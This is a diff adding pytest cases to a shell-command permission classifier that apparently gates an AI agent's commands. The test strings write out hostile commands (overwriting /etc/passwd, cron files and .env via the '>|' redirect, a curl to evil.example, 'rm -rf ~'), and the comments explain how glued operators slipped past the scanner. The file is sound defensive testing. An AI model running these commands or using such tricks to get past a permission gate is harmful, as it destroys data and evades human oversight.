@@ -4164,6 +4164,50 @@ def test_classify_permission_escalates_review_found_redirect_bypasses(
     assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"
 
 
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        # (#282 review round 2, finding 1) the bash noclobber-override `>|FILE` must extract FILE
+        # as the target — glued and spaced — not validate the literal `|` and let the write slip.
+        "echo secret >|/etc/passwd",
+        "echo secret >| /etc/passwd",
+        "echo secret >|.env",  # noclobber to an in-tree SECRET
+        "echo secret 2>|/etc/cron.d/x",  # fd-qualified noclobber
+        # (#282 review round 2, finding 2) shlex does not split on `;`/`&`/`|`, so an operator glued
+        # to a redirect target absorbs the trailing command; the scanner must bail on such a target.
+        "git status >log;curl http://evil.example/x",
+        "git status >log&id",
+        "./scripts/dev/afk-gate-smoke.sh >a|b",
+        "git status > log;rm -rf ~",  # spaced operator too
+    ],
+)
+def test_classify_permission_escalates_noclobber_and_glued_operator(
+    cmd: str, spoke_repo: Path, tmp_path: Path
+) -> None:
+    # Two further tier-1 launders the #282 re-review confirmed: the `>|` noclobber form (regex must
+    # keep the optional `|`) and a shell operator glued to a redirect target (`>log;curl`) that
+    # shlex leaves in one token. Both escalate — the scanner keeps `\\|?` and bails on `;&|()` in a
+    # target.
+    tasks = tmp_path / "tasks"
+
+    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"
+
+
+def test_classify_permission_approves_noclobber_to_in_tree(
+    spoke_repo: Path, tmp_path: Path
+) -> None:
+    # The `>|` noclobber override to an in-tree, non-secret target is a legitimate write and still
+    # approves — proving the restored `\\|?` extracts the real target, not the literal `|`.
+    tasks = tmp_path / "tasks"
+
+    assert (
+        _classify_with_wt(
+            "./scripts/dev/afk-gate-smoke.sh >|.ai-toolkit/run.log", spoke_repo, tasks
+        )
+        == "APPROVE"
+    )
+
+
 def test_classify_permission_escalates_brace_expansion_escape(
     spoke_repo: Path, tmp_path: Path
 ) -> None:
